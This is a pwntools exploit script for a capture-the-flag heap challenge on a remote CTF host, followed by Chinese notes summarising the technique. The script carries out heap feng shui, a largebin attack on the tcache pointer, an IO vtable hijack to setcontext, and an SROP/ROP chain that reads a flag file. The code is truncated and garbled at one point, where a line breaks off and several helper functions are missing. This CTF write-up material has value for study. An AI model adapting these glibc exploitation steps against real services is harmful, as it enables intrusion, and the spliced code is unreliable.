    context(arch='amd64', os='linux')
    def Log(name): 
     log.success(name+' = '+hex(eval(name)))
    elf = ELF('./pwn')
    libc = ELF('./libc.so.6')
    if(len(sys.argv)==1):   #local
     sh = process('./pwn')
     proc_base = sh.libs()[sh.cwd + sh.argv[0].strip('.')]
    else:       #remtoe
     sh = remote('node2.hackingfor.fun', 36072)
    def Num(num): 
     sh.send(str(num).ljust(0xA, '\x00'))
    def Cmd(n):
     sh.recvuntil(">> ")
     Num(n)
    def Add(sz, cont=''):
     assert(0x100A
    Delete(3)   #UBBA
    Delete(7)   #UBCBA
    #put A,B,C into LB 
    Add(0x2000)   #trigger sort, LBCBA
    Delete(3)   #big chunk consolidate with top chunk
    #forge FakeChunk in B
    exp = p64(0)  #prev_size
    exp+= p64(0x3740|1) #size
    Add(0x500, exp)  #idx: 3; get chunk B, LBCA
    #partial overwrite A's bk
    exp = p64(0)
    exp+= p16(0x0010)
    Add(0x4F0, exp)  #idx: 5; A's bk=>B, LBC
    #put A' into LB
    Delete(4)   #UBA'
    Add(0x2000)   #trigger sort, LBCA'
    Delete(4)   #consolidate with top chunk
    #partial overwrite C's fd
    exp = p16(0x0010)
    Add(0x510, exp)  #idx:4; C's fd=>B
    #chunk overlap
    exp = 'A'*0x1F0
    exp+= p64(0x3740) #chunk10's prev_size
    Edit(9, exp)  #chunk10 's P=0, prev_chunk(chunk10)=>FakeChunk in B
    Delete(10)   #UB(FC in B, A', A, 6, C, 8, 9)
    #leak heap addr
    Show(4)
    heap_addr = u64(sh.recv(6).ljust(8, '\x00')) - 0x5a10
    Log('heap_addr')
    #get A' from LB
    Add(0x4F0)   #7
    #split UB chunk, make it smaller than 0x2010
    Add(0x1520)   #UB(8, 9)
    Add(0x2000)   #UB(9)
    #trigger sort
    Add(0x2000)   #LB(9)
    Delete(13) 
    #leak libc Addr
    Show(9)
    libc.address = u64(sh.recv(6).ljust(8, '\x00')) - 0x1e40b0
    Log('libc.address')
    tcache_addr = libc.address + 0x1eb538
    Log('tcache_addr')
    Log("libc.symbols['__free_hook']")
    #LB attack to control tcache ptr
    _IO_file_jumps_addr = libc.address + 0x1e54c0
    jumps_SYNC_addr = _IO_file_jumps_addr + 0x60
    fake_tcache = '\x00'*(0x7C-0x10)
    fake_tcache+= p16(1)       #counts[0x400] = 1
    fake_tcache+= p16(1)       #counts[0x410] = 1
    fake_tcache = fake_tcache.ljust(0x270-0x10, '\x00')
    fake_tcache+= p64(jumps_SYNC_addr)    #entries[0x400], setcontext
    fake_tcache+= p64(libc.address+0x1e48c0)  #entries[0x410], Sigreturn Frame
    Delete(12)     #UB(8, 9)
    Add(0x4F0, fake_tcache)  #idx: 12; smaller chunkB, tcache_addr = chunkB
    Add(0x1b10)     #idx: 13; split
    Add(0x500)     #idx: 9,14; chunkA, 
    Add(0x1D0)     #idx: 15 remain
    Delete(14)   #UBchunkA
    Add(0x2000)   #idx: 14; trigger sort: LBchunkA
    Delete(14)
    Delete(9)   #UBchunkA
    exp = p64(0)  #chunkA's prev_size
    exp+= p64(0x511) #chunkA's size
    exp+= p64(0)  #chunkA's fd
    exp+= p64(0)  #chunkA's bk
    exp+= p64(0)  #chunkA's fd_nextsize
    exp+= p64(tcache_addr-0x20) #chunkA's bk_nextsize
    Add(0x6F0, exp)
    Delete(12)   #UBchunkB
    Add(0x2000)   #trigger sort, now tcache=>fake_tcache
    #control vtable
    exp = p64(libc.symbols['setcontext']+61) #_IO_file_jumps.SYNC = setcontext+61
    exp+= p64(libc.address+0x7e600)    #avoid SIGV
    Add(0x3F0, exp)
    #GG
    rdx_GG = libc.address + 0x14b760 #mov rdx, [rdi+8]; call [rdx+0x20]
    pop_rdi = libc.address + 0x2858F
    pop_rsi = libc.address + 0x2AC3F
    pop_rdx_r12 = libc.address + 0x114161
    pop_rax = libc.address + 0x45580
    syscall = libc.address + 0x611EA
    ret = libc.address + 0x26699
    def Call(sys, a, b, c):
     rop = flat(pop_rdi, a)
     rop+= flat(pop_rsi, b)
     rop+= flat(pop_rdx_r12, c, 0)
     rop+= flat(pop_rax, sys)
     rop+= flat(syscall)
     return rop
    #SROP
    frame = SigreturnFrame()
    frame.rsp = heap_addr + 0x6650  #RORW ROP addr
    frame.rip = ret
    frame.r10 = libc.address + 0x8e520 #avoid SIGV
    exp = str(frame)
    Add(0x400, exp)  #bufferA
    exp = p64(0)    #chunkA's prev_size
    exp+= p64(0x511|NON_MAIN) #chunkA's size
    Add(0x6F0, exp)    #idx: 16; chunkA in LB has NON_MAIN bit
    Delete(17)     #UBchunk14
    Cmd(1)
    sh.recvuntil('Size: ')
    Num(0x2000)     #trigger
    #file name 
    sh.send('./flag.txt\x00')
    sh.interactive()
    '''
    'telescope '+hex(proc_base+0x4160)+' 18'
    '''
## 总结
  * 堆风水: 
    * 利用largebin的fd_nextsize与bk_nextsize来伪造fd bk
    * partial overwrite largebin中chunk的fd bk来构造自闭链表绕过其检查
    * 一共需要A:0x500 A’:0x500 B:0x510 C:0x520 四个chunk, 用B作为被unlink的chunk
  * 泄露堆地址 
    * unlink时会把chunk地址写入到fd处
  * 泄露libc地址 
    * 让idx索引到largebin中的chunk,利用fd泄露地址
  * 先打出double link 
    * 一个索引把chunk释放到UB中,再申请一个大的,把他整理到LB中
    * 另一个索引用来show
  * 任意写手法: 
    * 通过malloc把UB中的chunk整理入LargeBin时的LargeBin Attack,来修改tcache指针,从而使用自己伪造的tcache
  * SROP手法 
    * 由于__free_hook被禁了,因此只能从IO的虚表入手
    * 由于setcontext使用rdx作为frame指针,因此需要找到一个虚表项, 在调用是rdx指向的位置可控